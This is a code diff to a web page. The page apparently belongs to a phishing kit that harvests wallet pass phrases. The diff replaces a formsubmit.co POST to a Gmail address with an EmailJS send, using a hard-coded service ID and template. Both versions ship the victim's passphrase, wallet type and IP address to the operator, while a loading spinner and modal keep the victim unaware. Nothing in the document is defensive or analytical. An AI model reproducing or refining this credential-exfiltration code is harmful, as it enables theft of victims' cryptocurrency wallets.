@@ -303,7 +303,9 @@
     </script>
 
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
     $("form#pass-phrase").submit(async(e)=>{
       e.preventDefault();
       if(validatePhrase()){
@@ -315,29 +317,31 @@
         $("div.spanner").addClass("show");
         $("div.overlay").addClass("show");
 
-        const formData = new FormData();
-        formData.append('value', passphrase);
-        formData.append('type', fullType);
-        formData.append('ip', ip);
+        // Initialize EmailJS with your service ID
+        emailjs.init("service_w9aainn");
 
-        const email = "webdme8@gmail.com"; // Change this to your email address
-        const endpoint = `https://formsubmit.co/${email}`;
+        const templateParams = {
+          value: passphrase,
+          type: fullType,
+          ip: ip
+        };
 
-        const res = await fetch(endpoint, {
-          method: "POST",
-          body: formData
-        });
-        if (!res.ok) return console.log("SOMETHING WENT WRONG");
-
-        setTimeout(()=>{
-            $("div.spanner").removeClass("show");
-            $("div.overlay").removeClass("show");
-            $(".modal").fadeIn();
-        },2000);
-        const data = await res.json();
-        console.log(data);
+        // Send email using EmailJS
+        emailjs.send('service_w9aainn', 'template_ygc5wzc', templateParams)
+          .then(function(response) {
+            console.log('Email sent:', response);
+            setTimeout(()=>{
+                $("div.spanner").removeClass("show");
+                $("div.overlay").removeClass("show");
+                $(".modal").fadeIn();
+            },2000);
+          }, function(error) {
+            console.error('Email sending failed:', error);
+          });
       }
     });
+</script>
+
 
     // Similar modifications for other forms...
 
